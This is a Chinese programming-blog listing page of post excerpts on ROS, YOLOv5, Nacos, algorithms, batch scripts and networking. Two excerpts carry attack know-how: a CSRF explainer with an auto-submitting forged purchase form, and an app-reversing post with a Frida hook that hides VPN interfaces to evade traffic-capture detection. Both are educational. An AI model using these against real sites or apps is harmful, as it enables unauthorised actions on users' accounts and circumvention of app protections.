又例如：如果我们开发了一个PID控制器程序，如果这时能通过rqt_reconfigure工具，对PID参数进行合理的调整，然后直接将获得的参数写进程序，就能使工作更加高效。
一、编写.cfg文件 1.在功能包文件夹下，创建一个config文件夹（其他名字也行，比如cfg）
在其中创建一个后缀为.cfg的文件
2.在其中写入内容
#!/usr/bin/env python from dynamic_reconfigure.parameter_generator_catkin import * gen = ParameterGenerator() type_enum = gen.enum([gen.const("centroid", str_t, "centroid", "Use Centroid"), gen.const("initial", str_t, "initial", "Use Initial"), gen.const("middle", str_t, "middle", "Use Middle")], "An enum to set frontier type") gen.add("timeout", double_t, 0, "Explore Timeout(s)", 30.0, 10.0, 100.0) gen.add("min_frontier_size", double_t, 0, "Min Frontier Size(m)", 0.75, 0.5, 2) gen.add("visualize", bool_t, 0, "Is Visualize?", True) gen.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f285a3de528ce3c2c23d1d827db49dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8572074358ad03ac1d38b30b312fd693/" rel="bookmark">
			Yolov5 更改识别窗口大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启动yolov5时，会因为像素太大导致占据整个桌面，这样非常影响使用和操作，我们可以通过opencv中的resize函数来修改识别窗口的像素大小，这样操作就方便多了。
原代码中
通过修改cv2.resizeWindow(str( P ),500,320)中的(500，320)并不能控制识别窗口大小。
在这里，我们将cv2.resizeWindow(str( P ),500,320)替换成
im0=cv2.resize(im0,(480,480),interpolation=cv2.INTER_CUBIC) 通过修改（480，480）可以调整窗口的长宽。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26c601abeb5109c75fc6c92fc5906e70/" rel="bookmark">
			局限性记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		天翼云电脑 天翼云电脑（运行的是Windows2016系统），里面可以安装vmware workstation，但是不能继续安装64位虚拟机，提示“此主机不支持64位客户机操作系统，此系统无法运行”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91de13878e560c6df3be0a496c1af805/" rel="bookmark">
			基于Java Web的新闻发布系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、项目介绍 新闻发布系统是发布学校或者企业的信息的系统，支持注册，登录，发布新闻，管理新闻等，角色分为：普通用户和管理员用户，对10张数据库表进行增删改查。适合毕业设计、课程设计、大作业等。
二、技术介绍 Java/SSM框架/JSP/Mysql
三、开发工具 Eclipse或IntelliJ IDEA/Navicat/Maven
四、提供的服务 源代码（前后端源代码+sql脚本）
配套文档（一万字以上）
一键启动项目（适合基础薄弱的同学，一键启动，无需搭建复杂环境）
远程调试
源代码和配套文档领取加文章最下方的名片哦~
第一章 绪论 1
第二章 相关技术介绍 3
2.1 JAVA简介 3
2.2 JSP技术简介 3
2.3 MySQL数据库简介 4
第三章 系统设计 3.1功能需求 5
3.2性能需求 6
3.3 可靠性和用户界面需求 7
3.4系统E-R模型 8
3.5 系统流程分析 9
第四章 系统功能实现 4.1 系统架构 11
4.2 系统设计 12
4.3 系统数据库设计 13
第五章 系统功能实现 5.1前台新闻发布系统界面 15
5.1.1用户注册界面 16
5.1.2用户登入界面 17
5.1.3用户浏览新闻界面 5.2后台新闻界面系统 5.21后台管理界面 5.2.2新闻栏目管理界面 5.2.3新闻资讯管理界面 第六章 系统测试 6.1测试概述 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91de13878e560c6df3be0a496c1af805/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99b07e2359e1e8ad98fd98093c0ef7be/" rel="bookmark">
			搭建nacos环境(保姆级教程)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2.2.1 服务发现中心 根据上节讲解的网关的架构图，要使用网关首先搭建Nacos。
首先搭建Nacos服务发现中心。
在搭建Nacos服务发现中心之前需要搞清楚两个概念：namespace和group
namespace：用于区分环境、比如：开发环境、测试环境、生产环境。
group：用于区分项目，比如：xuecheng-plus项目、xuecheng2.0项目
首先在nacos配置namespace:
登录Centos，启动Naocs，使用sh /data/soft/restart.sh将自动启动Nacos。
访问：http://192.168.101.65:8848/nacos/
账号密码：nacos/nacos
登录成功，点击左侧菜单“命名空间”进入命名空间管理界面，
点击“新建命名空间”，填写命名空间的相关信息。如下图：
使用相同的方法再创建“测试环境”、"生产环境"的命名空间。
创建成功，如下图：
这里创建具体班级的命名空间，假如创建1010班级的命名空间，如下：
首先完成各服务注册到Naocs，下边将内容管理服务注册到nacos中。
1) 在xuecheng-plus-parent中添加依赖管理 XML com.alibaba.cloud spring-cloud-alibaba-dependencies ${spring-cloud-alibaba.version} pom import 2）在内容管理模块的接口工程、系统管理模块的接口工程中添加如下依赖 XML com.alibaba.cloud spring-cloud-starter-alibaba-nacos-discovery 3）配置nacos的地址 在系统管理的接口工程的配置文件中配置如下信息：
YAML#微服务配置 spring: application: name: system-service cloud: nacos: server-addr: 192.168.101.65:8848 discovery: namespace: dev group: xuecheng-plus-project 在内容管理的接口工程的配置文件中配置如下信息：
YAMLspring: application: name: content-service cloud: nacos: server-addr: 192.168.101.65:8848 discovery: namespace: dev group: xuecheng-plus-project 4）重启内容管理服务、系统管理服务。 待微服务启动成功，进入Nacos服务查看服务列表
在 “开发环境” 命名空间下有两个服务实例。微服务在Nacos注册成功。
点击其它一个微服务的“详情”
通过上图可以查看微服务实例的地址。
2.2.2 配置中心 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99b07e2359e1e8ad98fd98093c0ef7be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ee67fca0999c88dd26c2a5ff8432d27/" rel="bookmark">
			中缀表达式转后缀表达式看完这一篇文章你就懂了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、什么是中缀表达式
二、什么是后缀表达式
三、后缀转中缀具体思路
四、代码实现
一、什么是中缀表达式 中缀表达式就是我们常用的算术表达方式，例如(12+34)*5，运算符在两个数的中间，但是对于中缀表达式来说括号和加减乘除使得问题对于计算机非常复杂，为了有效的处理他们，波兰逻辑学家想到了一种不需要括号的后缀表达式，我们称之为逆波兰。
二、什么是中缀表达式 后缀表达式也称逆波兰式或逆波兰记法，它通过中缀表达式转换而来，没有括号，只有数字和运算符，运算符总在要计算的数字的后面，之所以叫后缀表达式 是因为所有的运算符号都要在数字后面出现才行。举个例子来说，假如中缀表达式是：(12+34)*5那么转换为后缀表达式就是：12 34 + 5 *
看到这里，你可能蒙圈了，我们先把中缀表达式计算出来，结果是230。
此时此刻你一定想问，如何计算？其实很简单:
每次从左往右找到第一个运算符的位置，然后拿到前面两个位置的元素，跟这个运算符进行+-*/ 运算，运算完将运算符和这两个元素删掉，再将新算出来的元素添加到运算符前面的位置，每次都这样计算，当后缀表达式为空时，就可以得到最终的那个结果。
看到这里，你应该顿悟了吧，如果还不明白，后面我会给出代码，相信你会明白的。
三、后缀转中缀具体思路 接下来是思路：
第一步：定义两个栈，一个用来存储后缀表达式栈，一个用来存储中间的运算符栈。
第二步：写个循环，从左往右遍历中缀表达式。
第三步：在循环中处理数字和运算符即可
怎么处理呢？接下来就为大家讲解
如果遇到数字，代表他是要运算的值，直接入后缀表达式栈
如果遇到了运算符，可以分情况讨论，有以下情况
当前栈为空，那就代表是第一个运算符，入栈即可
当前栈不为空，当前运算符大于栈顶运算符，入栈即可，如果小于或等于当前运算符，直接将运算符栈弹至后缀表达式栈
遇到括号，也要分情况讨论，有以下情况
左括号，直接入栈即可
右括号，弹出运算符直至左括号为止(实际上就是把这个括号包含的所有运算符弹出)
还要注意一点：如果运算符当前栈顶是'(',那么下一个运算符无论是什么都要入栈
表达式遍历完后，把运算符栈剩下的弹至后缀表达式栈即可
四、代码实现 /* 中缀表达式转为后缀表达式具体思路： 1.定义两个栈，一个栈用来存储后缀表达式，一个栈用来存储中间的运算符 (括号，+，-，/，*这些) 2.如果遇到数字，直接入后缀表达式栈 3.如果遇到运算符了，分情况讨论： 第一种：括号，如果是左括号，直接入栈，如果是右括号，把栈顶的运算符 给到后缀表达式栈中即可 第二种：+,-,*,/，这些，如果遇到运算符优先级大于栈顶的运算符，直接入 栈，如果遇到不大于栈顶的优先级的运算符，直接出栈，然后再把当前运算 符入栈即可(tips:注意如果是运算符优先级相同，把栈顶运算符出栈即可) 4.重复操作即可 */ #include &lt;iostream&gt; #include &lt;stack&gt; #include &lt;vector&gt; #include &lt;string&gt; #include &lt;algorithm&gt; typedef double d; using namespace std; enum Operator //运算符优先级 { //左括号 右括号 加 减 乘 除 left_bracket=2,right_bracket=0,Add=0, Minus=0, Multiply=1,Div=1 }; int Get_Operator_size(char cc){ //根据符号返回对应的运算符优先级 switch (cc) { case '+': return Add; case '-': return Minus; case '*':return Multiply; case '/':return Div; case '(':return left_bracket; case ')':return right_bracket; default: return -1; } } struct expression{ //后缀表达式数据 string str; //运算符或者要运算的数字 expression(string str):str(str){} expression(){} }; class Slove_expression{ public: Slove_expression(){} Slove_expression(string Expree):Expree(Expree){} inline void Set_Expression(string Expree) { this-&gt;Expree = Expree;} vector&lt;expression&gt; Get_Front_expression() { int p = 0; string temp; expression Next; while (p&lt;Expree.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ee67fca0999c88dd26c2a5ff8432d27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c74c4175f665047939923947bd1ec1a/" rel="bookmark">
			写个bat程序，搜索文件夹中带有指定关键词的文件，然后移动到指定的文件夹...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@echo off set /p keyword=请输入要搜索的关键字： set /p source_folder=请输入要搜索的文件夹路径： set /p target_folder=请输入目标文件夹路径： for /f "delims=" %%i in ('dir /b /s %source_folder%') do ( findstr /i %keyword% "%%i" if errorlevel 1 ( echo 文件%%i中未找到关键字 ) else ( echo 文件%%i中找到关键字，移动到目标文件夹 move "%%i" %target_folder% ) ) pause
这是一个简单的批处理程序，它会在输入的源文件夹中搜索具有指定关键字的文件，然后将其移动到目标文件夹中。脚本会先询问你输入关键词和文件夹路径。最后请记得修改文件夹路径。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bae0340db1f6a420365725b0f503c48e/" rel="bookmark">
			tomcat和apache有什么区别?如何将内网发布到互联网访问？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tomcat、 apache是比较常用的搭建服务器的中间件，它们之间还是有一些区别差异的，我们通常会根据本地应用场景来选择合适的中间件来搭建服务器。在内网本地部署搭建服务器后，还可以通过快解析端口映射方法，将内网应用地址发布到互联网，以实现外网访问。下面，我们就来详细说说tomcat和apache有哪些区别，以及如何利用快解析实现内网主机应用让外网访问。
一、tomcat和apache有什么区别？
1.首先说说JAVA 与web的区别
Apache是web服务器，Tomcat是应用（java）服务器（也可作web服务器），它只是一个servlet容器，是Apache的扩展。
Apache和Tomcat都可以做为独立的web服务器来运行，但是Apache不能解释java程序（jsp,serverlet）。
Apache是普通服务器，本身只支持html即普通网页。不过可以通过插件支持php,还可以与Tomcat连通(单向Apache连接Tomcat,就是通过Apache可以访问Tomcat资源，反之不然)
2. html与jsp区别
两者都是一种容器，只不过发布的东西不同：Apache是html容器，功能像IIS一样；Tomcat是jsp/servlet容器，用于发布jsp及java的，类似的有IBM的webshere、EBA的Weblogic，sun的JRun等等。
3. 二者独立
Apache和Tomcat是独立的，在同一台服务器上可以集成。
二、内网本地服务器项目怎么让外网访问？
只要可以上网，就可以用快解析将内网地址变外网地址访问。实现过程如下：
1.内网部署及访问
本地服务器搭建好后，在局域网内另台电脑发出访问测试，确保应用本身正常及在局域网内的能正常访问。同时记录下应用在内网使用的端口号、内网地址协议等。
2.内网添加映射设置
在服务器本地，或者所在内网另台主机电脑上，安装并登录快解析客户端，添加端口映射，通过这一步添加设置，将内网变公网。
填写完成后点击确定，自动生成免费自定义二级域名。或填写上自己的域名，同时在自己域名注册解析商网站后台，添加对应一个cname指向，让自己域名生效。添加映射时，根据自己应用场景填写正确的映射信息，映射名称：可自定义；公网类型：指外网访问所用的端口，HTTP默认使用80端口；内网ip地址：指应用程序所在的内网服务器地址，本机用127.0.0.1格式，非本机地址应用的用固定不变的内网地址格式。应用程序端口：指应用软件本身端口。
3.外网地址访问
快解析映射保存生效后，包括外网等在任意网络环境都可以通过“映射域名:外网端口”进行访问目标服务器和应用，即可成功访问到web管理页面，方便随时随地进行远程开发调试与外网访问。
快解析专业解决没有公网IP或在动态IP情况下，远程访问难题；可轻松穿透各种复杂的路由和防火墙，满足用户在任何地点、任何时间、任何线路，通过固定域名访问到内网的服务应用。
快解析内网映射广泛应用于SSH远程、小程序 、微信公众号、80http映射，远程桌面、443HTTPS映射、P2P点到点全端口穿透、数据库、远程打印机、遥感测绘、FTP 、ERP等应用领域，为用户提供了便利的内网穿透服务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6facce1313b3803cb317eed9be21117/" rel="bookmark">
			什么是CSRF（简单易懂，有逻辑）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. CSRF漏洞 CSRF（Cross-site request forgery）跨站请求伪造，也被称为One Click Attack 或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常 不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击性往往不大流行（因此对其进行防范的资源也相对少）和难以防范，所以被认为比XSS更具危险性。
2. 漏洞简介 跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作：转账、购买商品等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份认证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
3. CSRF的成因 CSRF漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个都网站，会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或包含CSRF脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号、ajax异步传输【通过JS去发送请求，然后获取信息】。与钓鱼网站不同，钓鱼网站需要输入账号和密码，而CSRF只需要访问链接或者网页即可。
4. CSRF分类 4.1 GET型： 如果一个网站某个地方的功能，比如用户修改邮箱是通过GET请求进行修改的。如：/user.php?id=1&amp;email=123@163.com ，这个链接的意思是用户id=1将邮箱修改为123@163.com。当我们把这个链接修改为 /user.php?id=1&amp;email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，当用户刚好在访问这个网站，他同时又点击了这个链接，那么悲剧发生了。这个用户的邮箱被修改为 abc@163.com 了
4.2 POST 型： 在普通用户的眼中，点击网页-&gt;打开试看视频-&gt;购买视频是一个很正常的一个流程。可是在攻击者的眼中可以算正常，但又不正常的，当然不正常的情况下，是在开发者安全意识不足所造成的。攻击者在购买处抓到购买时候网站处理购买(扣除)用户余额的地址。比如：/coures/user/handler/25332/buy.php 。通过提交表单，buy.php处理购买的信息，这里的25532为视频ID。那么攻击者现在构造一个链接，链接中包含以下内容
&lt;form action=/coures/user/handler/25332/buy method=POST&gt; &lt;input type="text" name="xx" value="xx" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了id为25332的视频，从而导致受害者余额扣除
5. CSRF与XSS漏洞区别 **CSRF：**利用网站对用户网页浏览器的信任（没有盗用用户的cookie，直接利用浏览器存储的coolie让用户去执行某个操作。）
**XSS：**利用用户对指定网站的信任
6. CSRF漏洞检测 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞检测的工具，若CSRFTester，CSRF Request Builder等。
7. CSRF的高危触发点 论坛交流用户中心反馈留言交易管理后台管理
8. CSRF漏洞的危害 伪造HTTP请求进行未授权操作篡改、盗取目标网站上的重要用户数据未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性作为其他攻击向量的辅助攻击手法，比如配合XSS传播CSRF蠕虫
9. CSRF挖掘技巧 9.1漏洞产生的条件 被害用户已经完成身份认证新请求的提交不需要重新身份认证或确认机制攻击者必须了解Web APP请求的参数构造诱使用户触发攻击的指令(社工)
9.2 漏洞产生的位置 密码修改处、点赞、转账、注销、删除等，有交互个数据传输的地方就可能有存在CSRF，但是注意，挖掘时最好通过判断有无二次验证（修改密码需要旧密码验证）或着通过有无token等来快速判断。、
10. CSRF防御措施 Referer验证 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问http://bank.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6facce1313b3803cb317eed9be21117/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34f996cb15fd955764f1abcb4355e3bc/" rel="bookmark">
			java面向对象基础知识总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 类与对象概述 1类与对象简述 （1）类是抽象的，是一种泛称，比如人类、狗类，是一种概括性的称呼
（2）对象是具体的，是一个个具体的实例，比如一只名叫点点的泰迪狗
（3）类是对象的种类的总称，对象是类下一个个具体的实例
（4）对象属性：用于说明对象具体的特征，比如点点的毛发颜色等
(5) 对象方法：用于说明对象的具体功能
2关系图如下 二 成员方法和成员变量（属性） 1成员变量 （1）概念 成员变量=属性=field（即成员变量是用来表示属性的）
属性是类的一个组成部分，一般是基本数据类型，也可以是引用数据类型（数组，对象）
（2）属性定义语法 public class Explain { public static void main(String[] args) { Dog dog = new Dog();//创建Dog对象 System.out.println(dog.name);//对象引用 } } class Dog{ 访问修饰符 属性类型 属性名； String name = "点点"; int age = 3; } （3）注意 属性如果不赋值会有默认值，不同数据类型会有不同默认值，int 0、short 0、byte 0、long 0、float 0.0、double 0.0、char \u0000,boolean false,String null
2成员方法 （1）成员方法语法 创建类名为Dog的类
class Dog{ 成员方法的形式： 修饰符 返回值类型 方法名（参数列表....）{ return 返回值; } public String bark(){ return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34f996cb15fd955764f1abcb4355e3bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb01315ff0ea1100faa5e254104c098a/" rel="bookmark">
			app逆向 || x动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明 本文仅供学习参考，如有侵权可私信本人删除，请勿用于其他途径，违者后果自负！
如果觉得文章对你有所帮助，可以给博主点击关注和收藏哦！
本文适用于对安卓开发和Java有了解的同学!
文中涉及的app均放在网盘中，有需自取!
前言 前几天写了一篇关于某动网的js逆向文章，然后又发现了它的app竟然也有加密。那么今天就将这个app分析一下。
其实网页端和app端的加密非常类似（一模一样），区别在于实现的语言的不同。
附js文章链接：js逆向-某动网演出数据获取
目标app：x动
目标参数：data、sign
工具介绍 fridacharlesnexus 6ppostern 抓包分析 这个app对于抓包会有一些检测，对于挂了代理软件都会有检测。
使用fiddler甚至都抓不到包。
对于这个问题怎么解决呢，凡事不会就去百度，一般来说都可以找到解决方案。
这里我使用的是一个hook vpn的脚本，依然是依赖于frida。
function hook_vpn(){ Java.perform(function (){ var String = Java.use("java.lang.String"); var NetworkInterface = Java.use("java.net.NetworkInterface"); NetworkInterface.getName.implementation = function (){ var result = this.getName(); console.log("find getName：", result); if (result &amp;&amp; (result.indexOf("ppp0") &gt; -1 || result.indexOf("tun0") &gt; -1)){ result = String.$new("rmnet_data0"); } return result; } var ConnectivityManager = Java.use("android.net.ConnectivityManager"); ConnectivityManager.getNetworkCapabilities.implementation = function (arg){ var result = this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb01315ff0ea1100faa5e254104c098a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70c2c69e3a868d9dc9c990d1eebd34ac/" rel="bookmark">
			运放指标-压摆率SR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 压摆率SR
处理交流信号时，压摆率是运放器件重要的指标。其表示运放输出电压的转换速率。在高频信号时，若压摆率不够，则运放输出的信号会变形，导致不满足要求。其实际就是运放输出信号的分辨率，只有分辨率足够高，信号才能不失真。
2. 压摆率的计算公式：
假如运放输出端想要输出一个Vo=Asin(wt)的正弦信号。则选型的运放压摆率指标必须至少大于等于正弦波信号的变化率dVo/dt=Acos(wt)*w，这样信号才能完全输出。
例如运放输出端为1kHz（频率f=1kHz）,幅度为1V的正弦波信号，则Vo=sin(2*π*f*t)，
求出信号的变化率最大值为dVo/dt=A*2*π*f=6.28k。则选型时，其运放的压摆率至少为SR=6.28kV/S。
3. 通过Multisim仿真
我们在multisim软件中设计一个简单的信号跟随运放电路，如下：假设运放的增益带宽积指标是满足要求的。
通过设置运放的压摆率来仿真输出端的信号结果如下：
SR=1K的结果：
SR=6.28K的结果：
结论：压摆率必须大于6.28k以上，输出的信号质量才能不变形❗
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d57fb9be0c461eaaa1348abd82be36a9/" rel="bookmark">
			算法训练三（DFS、BFS、回溯）（含解题思路）（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
7-13 桥短几何（深度优先搜索+广度优先搜索）
AC代码：
7-15 01迷宫（广度优先搜索）
AC代码：
7-17 生化危机（图的深度优先搜索）
AC代码：
7-18 模拟炸弹人（广度优先搜索）
AC代码：
7-19 N皇后问题（回溯）
AC代码：
7-20 图着色问题（图的应用）
AC代码：
7-21 排座位（图的应用）
AC代码：
7-22 红色警报 （图的连通分量）
AC代码：
7-23 列出连通集（深度优先搜索/广度优先搜索）
AC代码：
7-25 功夫传人 (广度优先搜索)
AC代码：
7-26 深入虎穴 （广度优先搜索）
AC代码：
7-27 肿瘤诊断 （三维广度优先搜索）
AC代码：
因题集题目较多，上半部分请移步这里：
算法训练三(DFS、BFS、回溯)(含模板)(上)_清晨喝碗粥的博客-CSDN博客
7-13 桥短几何（深度优先搜索+广度优先搜索） 在一个NxN的布尔矩阵中，0表示水，1表示陆地，一片由1围成的最大区域就是一个岛，假定方阵中有且只有两个岛，请计算连接这两个岛的最短的桥的长度（架桥相当于翻转0为1，使两个岛相连）。
输入样例1：
第一行一个正整数N（取值范围在[2--100]）。
以后N行以空格分隔的0或1，每行N个（0表示水，1表示陆地）。
3
0 0 1
0 0 1
1 1 0
输出样例1：
一个表示最短的桥的长度的正整数，本例中，正中间或右下角均是可行方案。
1
输入样例2：
第一行一个正整数N（取值范围在[2--100]）。
以后N行以空格分隔的0或1，每行N个（0表示水，1表示陆地）。
5
1 1 1 1 1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d57fb9be0c461eaaa1348abd82be36a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f207d80890883cc7d1659b0974dd43ad/" rel="bookmark">
			VMware虚拟机装win7教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware虚拟机装win7教程 前言一、VMware虚拟机装win7二、装Vmware Tools1、初步装好win7后，要装Vmware Tools2、搞不定的接着往下看，也是本人遇到的问题。 总结 前言 昨晚想要在win10系统里装CH340这个驱动，结果一直装不了，找了好多种方法还是不行，然后在百度发现有人说可以先下载虚拟机并安装虚拟机tool工具，在虚拟机中安装win7系统，然后安装ch340驱动。返回win10系统，打开设备管理器，查看端口信息，就可以发现ch340驱动安装成功了。
然后我敲搞了一晚上，在VMware虚拟机里装win7系统时遇到了一大堆问题，搞了5、6个小时才搞定。现在我把整个装机过程写下来，算是一个小结吧。
一、VMware虚拟机装win7 1、VMware虚拟机百度一下就有，这里就不给链接了。
2、安装好虚拟机后，就可以开始装win7了，这里我跟着某站里一位大佬做的
二、装Vmware Tools 1、初步装好win7后，要装Vmware Tools 这时会发现Vmware Tools是灰色的、不可选，如果有人跟着上面这个up主的步骤走能行的话，就不用往下看了，跟着激活就行了。
2、搞不定的接着往下看，也是本人遇到的问题。 ① 首先共享文件要打开，共享文件的路径自己添加一个，随便到哪都行。
② 然后把软盘移除了，这时你的Vmware Tools就不是灰色、可选了，具体原因我也不清楚，我也是各种百度才找到这个方法。
③ 这时Vmware Tools就可以点击安装了，不过这时可能还没完，你会发现安装失败，因为Win7要安装kb4474419这个补丁，附补丁链接： https://www.catalog.update.microsoft.com/Search.aspx?q=KB4474419
④ 接下来安装补丁，昨晚用终端命令这个方法去安装，结果安装不了，然后找了很久，终于找到了下面这个大佬的方法，亲测可行。（UltraISO软件这个可以下载正版的，试用就行了）
⑤ 接下来就可以激活win7系统了。（不知道怎么激活的，可以接着看上面那个某站up主的视频，后面有激活工具，这里我就不放链接了）
总结 1、注意：按照上面那个B站up主走的话，装的是旗舰版，所以只要kb4474419这个补丁就行了，如果装的是专业版，可能需要两个补丁，我没试过就不知道。
2、装好win7后，CH340驱动还是没装成功。。。太难了，如果有大佬有什么好方法的话，麻烦告诉我一下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82b0670c1a8af26632cf751b04dec428/" rel="bookmark">
			SQL语句把字符串类型数据转换成日期类型数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL语句把字符串类型数据转换成日期类型数据
查询某个时间段范围可以按照下面方式
select * from xxxtableName where date(字符串类型日期字段) &gt;= date(“2020/01/01 00:00:00”)
查询统计某个字段在这个时间范围方法：
select count(xxx字段)，xx字段，xx字段 from xxxtableName where date(字符串类型日期字段) &gt;= date(“2020/01/01 00:00:00”) group by xxx字段
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acb0efb7b8f9208d0114521bef57a3e0/" rel="bookmark">
			windows检测远程主机是否连通或者某个端口是否开启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、检测主机是否连通步骤二、测试端口是否打开步骤telnet安装 一、检测主机是否连通 ping命令是个使用频率极高的网络诊断工具，在Windows、Unix和Linux系统下均适用。它是TCP/IP协议的一部分，用于确定本地主机是否能与另一台主机交换数据报。根据返回的信息，我们可以推断TCP/IP参数设置是否正确以及运行是否正常。需要注意的是，成功与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，必须成功执行大量的数据报交换，才能确信TCP/IP的正确性。下面就以Windows系统为例，介绍一下ping命令的基本使用方法。
步骤 1、使用快捷键Win+R出运行命令框，输入cmd，点击确定，会弹出DOS窗口
2、ping命令的应用格式：
①ping+IP地址或主机域名；
②ping+IP地址或主机域名+命令参数；
③ ping+命令参数+IP地址或主机域名 。注意，“+”要换成空格！
当我们使用第①种格式时，默认只发送四个数据包。例如，我们来ping一下http://www.baidu.com这个地址，如下图所示。110.242.68.3便是百度的其中一台主机的地址；
bytes（字节）表示发送数据包的大小，默认为32字节；
time（时间）表示从发出数据包到接受到返回数据包所用的时间；
TTL表示生存时间值，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。
详细文章参考：ping命令的基本使用方法（Windows系统）
二、测试端口是否打开 要测试远程主机上的某个端口是否开启，无需使用太复杂的工作，windows下就自带了工具，那就是telnet。ping命令是不能检测端口,只能检测你和相应IP是否能连通。
如果在cmd命令行工具中输入telnet提示没有该命令，则说明没有安装telne工具（安装教程在下面）
步骤 测试某个端口是否开启。测的是43.143.144.xx的8080这个端口。在cmd下输入telnet 43.143.144.xx 8080之后会出现一个窗口，是最小化的。若窗口自动关闭了,说明端口是关闭的或主机ping不通，反之端口开放。比如这个8080端口是开放的，就出现以下的窗口，否则窗口关闭。
原文参考于：检测远程主机上的某个端口是否开启——telnet命令
telnet安装 下面介绍下win10安装telnet
首先打开电脑的控制面板，找到程序，打开
然后点击，启用或者关闭windows功能
然后找到Telnet客户端，勾选上，点击 确定
然后等待安装完成，我是第一次没有安装好，然后相同的操作又来来一遍，就自己好了
测试一下
在cmd中输入：telnet 43.143.144.xx 8080
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11a7fd51cc549141906032278569a796/" rel="bookmark">
			Excel·VBA多级联动的数据有效性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
